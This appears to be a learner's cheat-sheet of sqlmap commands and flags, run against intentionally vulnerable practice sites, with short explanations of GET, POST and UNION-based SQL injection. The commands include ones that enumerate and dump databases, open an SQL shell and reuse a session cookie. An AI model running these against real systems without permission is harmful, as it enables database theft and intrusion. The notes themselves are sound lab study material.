python3 sqlmap.py --version


python3 sqlmap.py -u "https://ginandjuice.shop/catalog?id=1" --batch

 python3 sqlmap.py -u "https://ginandjuice.shop/catalog?id=1" --dbs --batch

#  Notes :
- SQL injection vulnerabilities happen when a web page takes input through a query parameter in the URL (like ?id=1) or through a form submission (POST data).
- By modifying the URL to include ?id=7, you have provided an explicit GET query parameter. This changes how web application security concepts are analyzed.
- When you put parameters directly into the URL like ?id=7, that is the textbook definition of the GET method.
- If analysis tool doesn't have the login cookie, It sends a test payload to /vulnerabilities/sqli/?id=7' UNION SELECT.. , The server blocks it instantly because there is no login cookie.
- Strategy Behind UNION Tests:
        A UNION-based injection is the fastest and most efficient way to extract data. It works by appending a second query onto the original query using the SQL operator UNION, forcing the database to combine the results of both and print them right onto the screen.
- Sqlmap with post request. It automatically injects various SQL payloads into the body parameters.

        
        
# sqlmap -h 

## Basic commands
-u              - url
--random-agent  - Use randomly selected HTTP User-Agent header value
--level         - Level of tests to perform (1-5, default 1)
-p              - Testable parameter(s)
--data          - Data string to be sent through POST (e.g. "id=1")
-D              - allows you to select the database name
--sql-shell     - give you an interactive SQL Shell
--dbms=DBMS     - Force back-end DBMS to provided value



## Enumeration commands
--dbs            - Enumerate DBMS databases
-T <TABLE NAME>  - DBMS database table(s) to enumerate
--columns        - Enumerate DBMS database table columns
--tables         - Enumerate DBMS database tables
--dump           - Dump DBMS database table entries
--current-user   - Retrieve DBMS current user

## Operating system access commands









python3 sqlmap -u https://pentest-ground.com:4280/vulnerabilities/sqli/?id=7 --dbs

python3 sqlmap.py -u https://pentest-ground.com:4280/vulnerabilities/sqli/?id=3&Submit=Submit --dbs

-----------------------------------------------------------------------------------
SQLi in GET URL Parameters
-----------------------------------------------------------------------------------
python3 sqlmap.py -u https://pentest-ground.com:4280/vulnerabilities/sqli/?id=3 --cookie "PHPSESSID=926c488e23b08c4c1638f651edfd5442" --dbs


The command runs SQLMap against the URL https://pentest-ground.com:4280/vulnerabilities/sqli/?id=3 to check whether the id parameter is vulnerable to SQL injection. It includes the PHPSESSID cookie so SQLMap can access the authenticated session, and the --dbs option instructs SQLMap to enumerate the names of available databases if a SQL injection vulnerability is successfully detected.
------------------------------------------------------------------------------------




--------------------------------------------------------------
SQLi in POST ,HTTP Request body Parameters
--------------------------------------------------------------

python3 sqlmap.py -r search-test.txt -p tfUPass

The command runs SQLMap using the HTTP request stored in search-test.txt. SQLMap reads the complete request from the file and tests only the tfUPass parameter for SQL injection, ignoring all other parameters in the request.
--------------------------------------------------------------
